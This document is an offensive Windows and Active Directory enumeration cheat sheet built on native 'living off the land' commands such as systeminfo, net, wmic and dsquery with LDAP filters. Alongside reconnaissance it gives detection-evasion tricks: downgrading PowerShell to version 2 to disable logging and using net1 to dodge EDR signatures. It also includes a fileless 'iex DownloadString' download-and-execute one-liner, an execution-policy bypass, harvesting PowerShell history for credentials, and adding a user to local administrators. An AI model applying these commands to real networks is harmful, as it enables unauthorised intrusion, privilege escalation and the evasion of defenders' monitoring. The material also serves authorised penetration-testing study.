**Overview:**
- Enumeration using only tools and commands native to Windows. Used when external tooling cannot be loaded onto the target or when stealth is required.
- Native commands generate fewer anomalous log entries and are less likely to trigger EDR or IDS/IPS alerts than imported tools. Most enterprise environments baseline normal traffic and flag deviations.
- PowerShell downgrades to version 2 (`powershell.exe -version 2`) disable Script Block Logging and Module Logging, which only apply to PowerShell 3+. Verify logging status in `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`.
- `net.exe` commands are commonly monitored by EDR. Substitute `net1` for `net` to execute identical functions without triggering string-based detections.
---
## Host and Domain Reconnaissance

|Command|Description|
|---|---|
|`systeminfo`|Comprehensive host overview: OS version, hotfixes, network adapters, domain, and logon server in one command.|
|`hostname`|Prints the hostname of the current machine.|
|`[System.Environment]::OSVersion.Version`|Prints OS version and revision level.|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Lists applied patches and hotfixes with install dates.|
|`ipconfig /all`|Prints network adapter state and full configuration.|
|`set`|Lists all environment variables for the current session. Run from CMD.|
|`echo %USERDOMAIN%`|Prints the domain the host belongs to. Run from CMD.|
|`echo %logonserver%`|Prints the domain controller the host authenticates against. Run from CMD.|
|`qwinsta`|Lists active sessions on the host. Useful for checking if other users are logged in.|

---
## PowerShell Enumeration

| Command                                                                                       | Description                                                                    |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| `Get-Module`                                                                                  | Lists available modules loaded for use.                                        |
| `Get-ExecutionPolicy -List`                                                                   | Prints execution policy settings for each scope on the host.                   |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                   | Bypasses execution policy for the current process only. Reverts on exit.       |
| `Get-ChildItem Env: \| ft Key,Value`                                                          | Returns environment variables including key paths, user, and computer info.    |
| `powershell.exe -version 2`                                                                   | Downgrades to PS version 2, disabling Script Block Logging and Module Logging. |
| `netsh advfirewall show allprofiles`                                                          | Displays firewall status and rules for all profiles (Domain, Private, Public). |
| `sc query windefend`                                                                          | Checks the status of the Windows Defender service.                             |
| `Get-Content $env:APPDATA\Microsoft\Windows\` `Powershell\PSReadline\ConsoleHost_history.txt` | Reads current user's PS history. May contain credentials or sensitive paths.   |
| `powershell -nop -c "iex(New-Object` `Net.WebClient).DownloadString('<url>'); <cmd>"`         | Downloads and executes a file from a URL in memory without touching disk.      |

---
## Network Information

|Command|Description|
|---|---|
|`arp -a`|Lists all known hosts stored in the ARP table.|
|`ipconfig /all`|Prints full adapter configuration including DNS servers and DHCP state.|
|`route print`|Displays the IPv4 and IPv6 routing table. Identifies known networks and layer 3 routes.|
|`netsh advfirewall show allprofiles`|Displays firewall status across all profiles.|

---
## WMI Enumeration

|Command|Description|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Lists applied patches and hotfixes.|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information and domain membership.|
|`wmic process list /format:list`|Lists all running processes on the host.|
|`wmic ntdomain list /format:list`|Displays information about the domain and domain controllers.|
|`wmic useraccount list /format:list`|Lists all local accounts and domain accounts that have logged into the device.|
|`wmic group list /format:list`|Lists all local groups.|
|`wmic sysaccount list /format:list`|Lists system accounts used as service accounts.|

---
## Net Commands

|Command|Description|
|---|---|
|`net accounts`|Displays local password policy requirements.|
|`net accounts /domain`|Displays domain password and lockout policy.|
|`net group /domain`|Lists all domain groups.|
|`net group "Domain Admins" /domain`|Lists members of the Domain Admins group.|
|`net group "Domain Controllers" /domain`|Lists domain controller computer accounts.|
|`net group "domain computers" /domain`|Lists all computers joined to the domain.|
|`net group <group-name> /domain`|Lists members of a specific domain group.|
|`net groups /domain`|Lists all domain groups.|
|`net localgroup`|Lists all local groups on the host.|
|`net localgroup administrators /domain`|Lists members of the local Administrators group, including Domain Admins.|
|`net localgroup Administrators`|Displays detailed info about the local Administrators group.|
|`net localgroup administrators <user> /add`|Adds a user to the local Administrators group.|
|`net share`|Lists currently active SMB shares.|
|`net user <user> /domain`|Retrieves detailed information about a specific domain user.|
|`net user /domain`|Lists all domain user accounts.|
|`net user %username%`|Displays information about the currently logged-in user.|
|`net use x: \\<computer>\<share>`|Mounts a remote share as a local drive letter.|
|`net view`|Lists computers visible on the network.|
|`net view /all /domain[:<domain>]`|Lists all shares on the domain.|
|`net view \\<computer> /ALL`|Lists all shares on a specific computer.|
|`net view /domain`|Lists all computers in the domain.|

---
## Dsquery

Dsquery is a built-in Active Directory query tool present on any host with the AD Domain Services role installed. The `dsquery.dll` is available on all modern Windows systems at `C:\Windows\System32\dsquery.dll`. Requires elevated privileges or a SYSTEM-level command prompt.

```powershell
dsquery user
```

List all user objects in the domain.

```powershell
dsquery computer
```

List all computer objects in the domain.

```powershell
dsquery * "CN=Users,DC=<domain>,DC=<tld>"
```

Wildcard query to list all objects within a specific OU or container.

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

Find users with the `PASSWD_NOTREQD` flag set in their UAC attribute. These accounts do not require a password to authenticate.

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

Find domain controllers in the current domain by filtering for UAC bitmask value 8192. `-limit 5` caps results at five.

---
## LDAP Filter Reference

LDAP filters used in dsquery and other tools follow the syntax `attribute:OID:=value`. The OID `1.2.840.113556.1.4.803` is a bitwise AND operator that matches objects where the specified bit is set in the target attribute.

|OID|Behavior|
|---|---|
|`1.2.840.113556.1.4.803`|Bitwise AND. Matches if ALL specified bits are set.|
|`1.2.840.113556.1.4.804`|Bitwise OR. Matches if ANY specified bits are set.|

Common UAC bitmask values for filtering:

|Value|UAC Flag|
|---|---|
|`512`|Normal user account.|
|`2`|Account disabled.|
|`32`|Password not required (`PASSWD_NOTREQD`).|
|`64`|Password cannot change.|
|`8192`|Domain controller.|
|`65536`|Password never expires.|

Logical operators combine filter criteria:

```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

AND operator. Matches user objects where the Password Can't Change bit is set.

```
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```

NOT operator. Matches user objects where the Password Can't Change bit is NOT set.